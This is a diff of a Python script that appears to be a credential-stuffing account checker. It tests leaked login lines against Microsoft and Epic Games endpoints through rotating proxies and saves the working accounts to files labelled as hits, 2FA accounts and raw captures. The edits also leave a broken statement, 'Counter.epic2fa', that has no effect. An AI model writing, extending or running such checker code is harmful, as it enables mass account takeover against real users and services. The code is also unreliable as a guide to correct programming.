@@ -758,7 +758,7 @@ class Main:
                                                     break
                                             except Exception as e:
                                                 Counter.retries+=1
-                                                continue
+                                                continue                             
                                         url = "https://www.epicgames.com/id/api/csrf"
                                         headers = {
                                             "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8",
@@ -818,12 +818,12 @@ class Main:
                                                 response = scraper.get(url, headers=headers, cookies=response.cookies, proxies=self.proxies(), timeout=Checker.timeout)
                                                 if '"sid":null,' in response.text or 'Please fill your real email' in response.text:
                                                     if ret >= Checker.retries:
-                                                        Counter.mshit+=1
+                                                        Counter.epic2fa
                                                         if 'n' == self.cuimode:
                                                             self.prints(f'{Fore.GREEN}[MS-HIT] - {line}')
                                                         if not os.path.exists(self.folder + '/Microsoft'):
                                                             os.makedirs(self.folder + '/Microsoft')
-                                                        open(f'{self.folder}/Microsoft/Hits.txt', 'a',
+                                                        open(f'{self.folder}/Microsoft/2fa.txt', 'a',
                                                         encoding='u8').write(f'{line}\n')
                                                         return
                                                     else:
@@ -839,6 +839,10 @@ class Main:
                                             except Exception as e:
                                                 Counter.retries+=1
                                                 continue
+                                        if not os.path.exists(self.folder + '/NoCapture'):
+                                            os.makedirs(self.folder + '/NoCapture')
+                                        open(f'{self.folder}/NoCapture/raw.txt', 'a',
+                                        encoding='u8').write(f'{line}\n')
                                         url = f"https://www.epicgames.com/id/api/sso?sid={sid}"
                                         headers = {
                                                 "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
